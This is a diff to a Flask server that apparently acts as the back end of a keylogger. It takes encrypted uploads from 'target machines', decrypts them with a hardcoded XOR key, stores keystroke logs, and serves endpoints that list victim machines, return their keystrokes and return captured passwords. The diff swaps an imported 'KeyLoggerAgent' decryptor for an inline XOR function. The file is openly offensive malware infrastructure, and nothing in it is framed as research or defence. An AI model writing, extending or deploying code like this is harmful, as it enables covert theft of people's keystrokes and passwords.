@@ -3,7 +3,6 @@ from datetime import datetime
 from flask import Flask, jsonify, request, json
 from flask_cors import CORS
 import time
-from KeyLoggerAgent import encryptor
 
 DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")
 
@@ -22,7 +21,7 @@ def upload():
         return jsonify({"error": "Invalid payload"}), 400
 
     machine = data["machine"]
-    log_data_decrypted = encryptor.Encryptor().decrypt(data["data"])
+    log_data_decrypted = decrypt("secretkey1", data["data"])
     print(f"Decrypted data: {log_data_decrypted}")
 
     machine_folder = os.path.join(DATA_FOLDER, next(iter(machine)))
@@ -56,6 +55,10 @@ def upload():
         json.dump(existing_data, f, ensure_ascii=False, indent=4)
 
     return jsonify({"status": "success", "file": file_path, "data": log_data_decrypted}), 200
+
+def decrypt(key: str, data: str):
+    decrypted = ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, key * (len(data) // len(key) + 1)))
+    return decrypted
 
 
 @app.route('/api/get_target_machines_list', methods=['GET'])
@@ -94,7 +97,6 @@ def get_target_machine_key_strokes():
         return jsonify({"error": "Invalid data format in logs"}), 500
 
     return jsonify({"keystrokes": keystrokes}), 200
-
 
 @app.route('/api/get_passwords', methods=['GET'])
 def get_passwords():
